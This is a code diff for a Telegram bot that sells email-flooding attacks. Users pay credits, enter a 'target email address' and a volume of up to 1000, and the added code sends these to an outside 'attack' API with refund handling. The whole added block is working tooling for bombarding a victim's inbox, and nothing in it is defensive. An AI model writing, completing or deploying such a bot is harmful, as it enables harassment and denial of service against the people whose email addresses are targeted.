@@ -92,37 +92,24 @@ function validateEmail(email) {
     return re.test(email);
 }
 
+
 bot.onText(/\/send/, (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id.toString();
 
-    // Reset the previous state if exists
-    db.run("DELETE FROM steps WHERE userId = ?", [userId], (deleteErr) => {
-        if (deleteErr) {
-            console.error("Failed to reset steps for user:", deleteErr);
+    db.get("SELECT * FROM users WHERE id = ?", [userId], (err, user) => {
+        if (err) {
+            bot.sendMessage(chatId, "Error accessing your account. Please try again later.");
+            return;
         }
 
-        // Ensure the user is registered
-        db.get("SELECT * FROM users WHERE id = ?", [userId], (err, user) => {
-            if (err) {
-                bot.sendMessage(chatId, "Error accessing your account. Please try again later.");
-                return;
-            }
+        if (!user) {
+            bot.sendMessage(chatId, "Your account is not registered. Please start with /start.");
+            return;
+        }
 
-            if (!user) {
-                bot.sendMessage(chatId, "Your account is not registered. Please start with /start.");
-                return;
-            }
-
-            // Ask for the email address
-            bot.sendMessage(chatId, "Please enter the target email address:");
-            // Initialize the process with 0 attempts for both email and amount
-            db.run("INSERT INTO steps (userId, step, email_attempts, amount_attempts) VALUES (?, 'input_email', 0, 0)", [userId], (insertErr) => {
-                if (insertErr) {
-                    console.error("Failed to insert step for user:", insertErr);
-                }
-            });
-        });
+        bot.sendMessage(chatId, "Please enter the target email address:");
+        db.run("INSERT OR REPLACE INTO steps (userId, step, email_attempts, amount_attempts) VALUES (?, 'input_email', 0, 0)", [userId]);
     });
 });
 
@@ -131,7 +118,6 @@ bot.onText(/.*/, async (msg) => {
     const userId = msg.from.id.toString();
     const text = msg.text;
 
-    // Handle steps
     db.get("SELECT * FROM steps WHERE userId = ?", [userId], async (err, row) => {
         if (err || !row) return;
 
@@ -153,7 +139,7 @@ bot.onText(/.*/, async (msg) => {
 
             case 'input_amount':
                 const emailAmount = parseInt(text);
-                if (!emailAmount || emailAmount < 10 || emailAmount > 1000) {
+                if (isNaN(emailAmount) || emailAmount < 10 || emailAmount > 1000) {
                     if (row.amount_attempts >= 1) {
                         bot.sendMessage(chatId, "Invalid amount entered twice. Process canceled.");
                         db.run("DELETE FROM steps WHERE userId = ?", [userId]);
@@ -162,17 +148,53 @@ bot.onText(/.*/, async (msg) => {
                         db.run("UPDATE steps SET amount_attempts = amount_attempts + 1 WHERE userId = ?", [userId]);
                     }
                 } else {
-                    // Proceed with the existing logic for a valid amount
-                    // This is where you would continue your implementation for sending emails
-                    // ...
+                    // Assuming 1 credit per email is needed
+                    const creditsNeeded = emailAmount;
+
+                    db.get("SELECT credits FROM users WHERE id = ?", [userId], async (err, user) => {
+                        if (err || !user) {
+                            bot.sendMessage(chatId, "There was a problem retrieving your credit information.");
+                            return;
+                        }
+
+                        if (creditsNeeded > user.credits) {
+                            bot.sendMessage(chatId, "You do not have enough credits to send this many emails. Please recharge.");
+                        } else {
+                            // Deduct credits and attempt to send emails
+                            db.run("UPDATE users SET credits = credits - ? WHERE id = ?", [creditsNeeded, userId], async (error) => {
+                                if (error) {
+                                    bot.sendMessage(chatId, "There was a problem updating your credits. Please try again.");
+                                    return;
+                                }
+
+                                   // Now perform the API call to send the emails
+                        try {
+                            const url = `https://strike.pw/api/v1/public/attack?key=${process.env.STRIKE_API_KEY}&target=${encodeURIComponent(row.email)}&mode=normal&amount=${emailAmount}`;
+                            const response = await axios.get(url);
+
+                                    // Check response for success from your email API
+                                    if (response.data.success) {
+                                        bot.sendMessage(chatId, `Emails sent successfully! You have used ${creditsNeeded} credits.`);
+                                    } else {
+                                        // Handle case where the API fails to send the emails
+                                        bot.sendMessage(chatId, "Failed to send emails. Your credits have been refunded.");
+                                        db.run("UPDATE users SET credits = credits + ? WHERE id = ?", [creditsNeeded, userId]);
+                                    }
+                                } catch (error) {
+                                    bot.sendMessage(chatId, "There was an error sending emails. Your credits have been refunded.");
+                                    db.run("UPDATE users SET credits = credits + ? WHERE id = ?", [creditsNeeded, userId]);
+                                }
+                            });
+                        }
+
+                        // Reset the step regardless of the outcome to allow the user to start over
+                        db.run("DELETE FROM steps WHERE userId = ?", [userId]);
+                    });
                 }
                 break;
-
-            // ... rest of the switch-case logic for different steps if any
         }
     });
 });
-
 
 bot.onText(/\/info/, (msg) => {
     const chatId = msg.chat.id;
